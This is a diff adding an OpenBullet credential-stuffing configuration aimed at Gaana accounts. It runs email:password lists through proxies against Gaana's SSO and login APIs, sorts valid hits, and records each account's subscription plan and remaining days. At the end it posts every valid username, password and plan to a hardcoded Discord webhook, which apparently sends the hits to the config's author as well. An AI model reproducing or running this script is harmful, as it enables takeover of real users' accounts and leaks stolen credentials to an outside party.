@@ -1,0 +1,161 @@
+[SETTINGS]
+{
+  "Name": "Gaana",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-10-29T07:46:56.6332731-07:00",
+  "AdditionalInfo": "",
+  "Author": "OpenbulletConfigsOfficial",
+  "Version": "1.2.9 Anomaly",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://gaana.com/api/csrf-token" 
+  CONTENT "set=csrf" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept: */*" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Host: gaana.com" 
+  HEADER "Origin: https://gaana.com" 
+  HEADER "Referer: https://gaana.com/login" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148" 
+
+FUNCTION Constant "<COOKIES(connect.sid)>" -> VAR "SID" 
+
+PARSE "<SOURCE>" LR "\"" "\"" -> VAR "CSRF" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "<CSRF>" EqualTo "\"\"" 
+    KEY "<SID>" DoesNotExist 
+
+REQUEST POST "https://gaanajsso.indiatimes.com/sso/crossapp/identity/web/verifyLoginOtpPassword" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept: */*" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Host: gaanajsso.indiatimes.com" 
+  HEADER "IsJssoCrosswalk: true" 
+  HEADER "Origin: https://gaana.com" 
+  HEADER "Referer: https://gaana.com/login" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148" 
+  HEADER "channel: gaana.com" 
+  HEADER "csrfToken: " 
+  HEADER "csut: " 
+  HEADER "gdpr: " 
+  HEADER "platform: WAP" 
+  HEADER "sdkVersion: 0.5.7" 
+  HEADER "ssec: " 
+  HEADER "tksec: " 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\"UNREGISTERED_EMAIL\"" 
+    KEY "\"WRONG_OTP_PASSWORD\"" 
+    KEY "\"UNVERIFIED_EMAIL\"" 
+    KEY "\"INVALID_EMAIL\"" 
+  KEYCHAIN Success OR 
+    KEY "\"status\":\"SUCCESS\"" 
+  KEYCHAIN Ban OR 
+    KEY "IP_BLOCKED" 
+
+PARSE "<SOURCE>" JSON "data.ticketId" JTokenParsing=TRUE -> VAR "TICKET_ID" 
+
+FUNCTION URLEncode "<USER>" -> VAR "USER" 
+
+FUNCTION URLEncode "<PASS>" -> VAR "PASS" 
+
+REQUEST POST "https://gaana.com/api/login" 
+  CONTENT "client_id=&csrf=<CSRF>&email=<USER>&password=<PASS>&redirect_uri=&response_type=&scope=&source=&state=&ticketid=<TICKET_ID>&urlChecker=false" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept: */*" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cookie: pageload=true; ver=dev321; __g_l=1; connect.sid=<SID>" 
+  HEADER "Host: gaana.com" 
+  HEADER "Origin: https://gaana.com" 
+  HEADER "Referer: https://gaana.com/login" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 11_0_1 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A402 Safari/604.1" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\"status\":\"error\"" 
+    KEY "\"status\":\"form_error\"" 
+  KEYCHAIN Success OR 
+    KEY "\"status\":\"success\"" 
+
+REQUEST POST "https://gaana.com/api/user-profile" 
+  CONTENT "profile=profile" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept: */*" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Host: gaana.com" 
+  HEADER "Origin: https://gaana.com" 
+  HEADER "Referer: https://gaana.com/profile" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 11_0_1 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A402 Safari/604.1" 
+
+PARSE "<SOURCE>" JSON "subscriptionStatus.productName" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "Plan" 
+
+PARSE "<SOURCE>" JSON "subscriptionStatus.validupto" JTokenParsing=TRUE -> VAR "EXP" 
+
+FUNCTION DateToUnixTime "dd MMM yyyy" "<EXP>" -> VAR "EXP" 
+
+FUNCTION CurrentUnixTime -> VAR "CURR_TIME" 
+
+FUNCTION Compute "(<EXP>-<CURR_TIME>)/86400" -> VAR "Days Left" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<Plan>" EqualTo "Free Plan" 
+    KEY "<Plan>" EqualTo "Ad Supported Free Streaming" 
+    KEY "<Days Left>" LessThan "0" 
+
+FUNCTION UnixTimeToDate "dd MMM, yyyy" 
+
+FUNCTION Constant "<Days Left>" -> VAR "Days Left" 
+
+FUNCTION Round "<Days Left>" -> CAP "Days Left" 
+
+FUNCTION Constant "openbulletConfigsOfficial" -> CAP "Config By" 
+
+#PLAN REQUEST POST "https://discord.com/api/webhooks/770393238015705088/bC8IsOuD9NH4iA3vTaFZ-KGYGPYWMFbkwU8V-H7_II7DAqhVoctJVlAsszUfDDM5UZ7j" 
+  CONTENT "{\"content\":\" GAANA - <USER>:<PASS> Plan <Plan> EXP <EXP>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
